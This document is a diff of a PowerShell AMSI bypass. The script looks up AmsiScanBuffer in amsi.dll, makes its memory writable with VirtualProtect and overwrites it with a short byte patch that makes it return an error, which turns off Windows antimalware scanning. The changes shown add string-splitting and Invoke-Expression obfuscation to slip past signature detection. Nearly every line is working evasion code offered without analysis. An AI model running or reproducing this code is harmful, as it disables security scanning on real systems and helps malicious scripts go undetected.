@@ -35,13 +35,15 @@ $func). SetImplementationFlags('Runtime, Managed')
 }
 
 
-$a="A"
-$b="msiS"
-$c="canB"
-$d="uffer"
-[IntPtr]$funcAddr = LookupFunc amsi.dll ($a+$b+$c+$d)
+$params = @("msi", "S", "B", "ff");
+
+
+[IntPtr]$funcAddr = LookupFunc $(("a{0}" -f $params[0])+".d"+"ll") ("A{0}{1}can{2}u{3}er" -f $params)
 $oldProtectionBuffer = 0
 $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
 $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
 $buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 12)
+
+$a='[System.Runtime.InteropServices.Marshal]::Co'
+$b='py($buf, 0, $funcAddr, 12)'
+IEX($a+$b)
